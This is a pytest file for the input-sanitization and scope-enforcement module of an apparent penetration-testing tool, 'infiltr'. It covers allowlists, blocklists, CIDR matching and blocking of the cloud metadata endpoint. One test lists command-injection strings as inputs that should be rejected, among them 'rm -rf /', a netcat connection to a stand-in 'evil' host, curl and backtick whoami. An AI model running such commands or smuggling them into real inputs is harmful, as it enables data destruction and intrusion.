"""Input sanitization + scope enforcement (allowlist/blocklist)."""
import pytest

from infiltr import safety
from infiltr.safety import ScopeError


def test_sanitize_rejects_injection():
    for bad in ["-oG/tmp/x", "a;rm -rf /", "a | nc evil 4444", "a && curl x", "a`whoami`", "a b"]:
        with pytest.raises(ScopeError):
            safety.sanitize_target(bad)


def test_sanitize_accepts_normal_targets():
    for good in ["http://localhost:8080", "192.168.1.10", "example.com", "http://a.b.c/path"]:
        assert safety.sanitize_target(good) == good


def test_blocklist_default_metadata(monkeypatch):
    monkeypatch.delenv("INFILTR_BLOCKLIST", raising=False)
    monkeypatch.delenv("INFILTR_ALLOWLIST", raising=False)
    with pytest.raises(ScopeError):
        safety.check_scope("http://169.254.169.254/latest/meta-data")


def test_allowlist_restricts(monkeypatch):
    monkeypatch.setenv("INFILTR_ALLOWLIST", "*.corp.local,10.0.0.0/8")
    monkeypatch.delenv("INFILTR_BLOCKLIST", raising=False)
    assert safety.is_in_scope("http://app.corp.local")
    assert safety.is_in_scope("http://10.1.2.3")
    assert not safety.is_in_scope("http://example.com")


def test_blocklist_overrides(monkeypatch):
    monkeypatch.setenv("INFILTR_BLOCKLIST", "prod.corp.local")
    monkeypatch.setenv("INFILTR_ALLOWLIST", "*.corp.local")
    assert safety.is_in_scope("http://staging.corp.local")
    assert not safety.is_in_scope("http://prod.corp.local")


def test_cidr_matching(monkeypatch):
    monkeypatch.setenv("INFILTR_ALLOWLIST", "192.168.0.0/16")
    monkeypatch.delenv("INFILTR_BLOCKLIST", raising=False)
    assert safety.is_in_scope("192.168.5.5")
    assert not safety.is_in_scope("172.16.0.1")
